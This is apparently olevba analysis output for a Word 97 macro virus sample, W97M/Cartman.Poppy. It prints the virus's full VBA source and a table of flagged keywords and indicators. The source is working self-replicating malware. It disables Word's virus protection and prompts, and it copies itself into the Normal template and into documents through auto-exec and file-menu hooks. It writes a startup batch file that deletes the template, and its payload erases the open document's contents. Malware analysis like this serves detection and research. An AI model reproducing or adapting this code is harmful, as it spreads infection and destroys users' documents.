olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-a8a774c3eca4be7441dda160f0c98979fc3be122
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-a8a774c3eca4be7441dda160f0c98979fc3be122 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cartman.bas 
in file: Virus.MSWord.VMPC-based-a8a774c3eca4be7441dda160f0c98979fc3be122 - OLE stream: 'Macros/VBA/Cartman'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Cartman()

    'W97M/Cartman.Poppy
    'By VicodinES (The Kyle of The Virus Underground)
    'Macro Virus for Word 97
    '"The Fat-ass Macro97 Engine v2.3 featuring Starvin' Marvin Technology"
    
    On Error Resume Next
    
    
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "VicodinES"
        .Title = "Another W97M/Cartman.Poppy Infected Document"
        .Subject = "Macro Virus Infection by The Narkotic Network"
        .Comments = "Hello from VicodinES and The Narkotic Network ... we mean you no harm"
        .Keywords = " | VicodinES | Klonopin.Jones | Fastin.Blee | "
        .Execute
    End With
    
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = False
        .Password = ""
        .WritePassword = ""
    End With
    
    msfile$ = "c:\windows\startm~1\programs\startup\msfile.bat"
    dork = 0
    Soma$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
    nfat = GetAttr(NormalTemplate.FullName)
    If nfat = vbReadOnly Then Call vBitchES(msfile$)
    If nfat = vbReadOnly + vbArchive Then Call vBitchES(msfile$)
    If nfat = vbReadOnly Then GoTo fuckoff
    If nfat = vbReadOnly + vbArchive Then GoTo fuckoff
    If Soma$ = UCase(NormalTemplate) Then dork = 1
    If dork = 1 Then one$ = NormalTemplate.FullName Else one$ = ActiveDocument.FullName
    If dork = 1 Then two$ = ActiveDocument.FullName Else two$ = NormalTemplate.FullName
  
            Application.OrganizerCopy Source:=one$, Destination:=two$, Name:="Cartman", Object:=wdOrganizerObjectProjectItems
        
    If dork = 1 Then If Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    If dork = 0 Then
            If NormalTemplate.Saved = False Then NormalTemplate.Save
        End If
fuckoff:
    
End Sub
Sub FileSave()
    On Error Resume Next
    Call Cartman
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call Cartman
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FilePrint()
    On Error Resume Next
    Call Cartman
    ActiveDocument.PrintOut
End Sub
Sub FileExit()
    On Error Resume Next
    Call Cartman
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call Starvin_Marvin
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call Starvin_Marvin
End Sub
Sub Starvin_Marvin()
    'Bad Ideas For Bad People
    On Error Resume Next
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    ActiveDocument.Hyperlinks.Add Anchor:=Selection.Range, Address:= _
        "http://www.yahoo.com/News_and_Media/Television/Shows/Cartoons/South_Park/"
    ActiveDocument.FollowHyperlink Address:= _
        "http://www.yahoo.com/News_and_Media/Television/Shows/Cartoons/South_Park/" _
        , NewWindow:=False, AddHistory:=True
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    MsgBox "You Killed Kenny, You Bastard!", vbExclamation, "The Narkotic Network"
    Application.Quit
    End
End Sub
Sub FileNew()
    On Error Resume Next
    Call Cartman
    Documents.Add Template:=NormalTemplate.FullName, NewTemplate:=False
    Skip = 1
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Cartman
End Sub
Sub AutoExec()
    On Error Resume Next
    Call Cartman
End Sub
Sub AutoClose()
    On Error Resume Next
    Call Cartman
End Sub
Sub vBitchES(strFile As String)
 
 Dim hFile As Long
 
 On Error Resume Next
 
 n$ = NormalTemplate
 Part1$ = "@echo off"
 Part11$ = "attrib -h -r "
 snag$ = "c:\progra~1\micros~1\templa~1\"
 snag1$ = "c:\progra~1\micros~2\templa~1\"
 Part2$ = "del "
 Part33$ = "cls"
 
     hFile = FreeFile
     Open strFile For Output Access Write As hFile
     Print #hFile, Part1$
     Print #hFile, Part11$ + snag$ + n$
     Print #hFile, Part11$ + snag1$ + n$
     Print #hFile, Part2$ + snag$ + n$
     Print #hFile, Part2$ + snag1$ + n$
     Print #hFile, Part33$
     Print #hFile, Part2$ + msfile$
     Close hFile
     
     GoTo Hell
     
Hell:

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.yahoo.com|URL                                          |
|          |/News_and_Media/Tele|                                             |
|          |vision/Shows/Cartoon|                                             |
|          |s/South_Park/       |                                             |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

